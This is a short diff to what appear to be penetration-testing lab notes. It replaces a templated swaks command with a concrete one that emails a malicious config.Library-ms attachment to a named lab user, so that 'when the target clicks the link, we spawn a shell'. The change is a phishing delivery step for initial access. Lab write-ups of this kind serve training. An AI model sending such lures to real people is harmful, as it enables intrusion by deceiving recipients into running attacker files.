@@ -44,8 +44,5 @@ Then, when the target clicks the link, we spawn a shell.
 
 
 ```
-sudo swaks -t ${TARGET_1} -t ${TARGET_2} \
---from ${USER@DOMAIN} --attach @config.Library-ms \
---server ${MAIL_SERVER_IP} --body @body.txt \ 
---header "Subject: ${HEADER}" --suppress-data -ap
+sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.248.189 --body @body.txt --header "Subject: ${HEADER}" --suppress-data -ap
 ```
